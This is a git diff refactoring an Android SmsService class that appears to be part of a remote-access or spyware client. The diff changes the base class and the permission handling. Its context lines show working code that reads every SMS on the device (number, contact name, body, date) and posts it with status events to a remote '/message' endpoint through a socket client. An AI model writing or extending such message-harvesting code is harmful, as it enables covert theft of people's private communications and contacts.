@@ -21,19 +21,18 @@ import io.socket.client.Socket;
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;
 
-public class SmsService extends Thread implements Runnable {
+public class SmsService extends BaseService {
 
     private static String TAG = "SmsService";
 
     public static final String POSTURL = "/message";
 
     private CommonParams commonParams;
-    private Client client;
     private Socket socket;
     private int numsms;
 
     public SmsService(Client client, int numsms) {
-        this.client = client;
+        context = client;
         this.socket = client.getSocket();
         this.numsms = numsms;
         this.commonParams = new CommonParams(client);
@@ -48,7 +47,7 @@ public class SmsService extends Thread implements Runnable {
     private void getAllSms() {
         Log.i(TAG, "Getting all sms");
 
-        if(ContextCompat.checkSelfPermission(client, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+        if(ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
 
             HashMap start = new HashMap();
             start.put("event", "getmessages:started");
@@ -61,7 +60,7 @@ public class SmsService extends Thread implements Runnable {
             req.execute();
 
             Uri callUri = Uri.parse("content://sms");
-            ContentResolver cr = client.getApplicationContext().getContentResolver();
+            ContentResolver cr = context.getApplicationContext().getContentResolver();
             Cursor mCur = cr.query(callUri, null, null, null, null);
             if (mCur.moveToFirst()) {
                 do {
@@ -75,7 +74,7 @@ public class SmsService extends Thread implements Runnable {
                         String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                         String id = mCur.getString(mCur.getColumnIndex("_id"));
                         String phone = mCur.getString(mCur.getColumnIndex("address"));
-                        String name = client.getContactName(client.getApplicationContext(), phone);
+                        String name = getContactName(context.getApplicationContext(), phone);
                         String body = mCur.getString(mCur.getColumnIndex("body"));
                         String date = formatter.format(calendar.getTime());
                         String type = mCur.getString(mCur.getColumnIndex("type"));
@@ -144,11 +143,8 @@ public class SmsService extends Thread implements Runnable {
             doneSMS.setMethod("POST");
             doneSMS.setParams(noPermit);
             doneSMS.execute();
-            //ask permissions
-            Intent i = new Intent(client, MainActivity.class);
-            i.addFlags(FLAG_ACTIVITY_NEW_TASK);
-            i.addFlags(FLAG_ACTIVITY_NO_HISTORY);
-            client.startActivity(i);
+
+            requestPermissions();
         }
     }
 
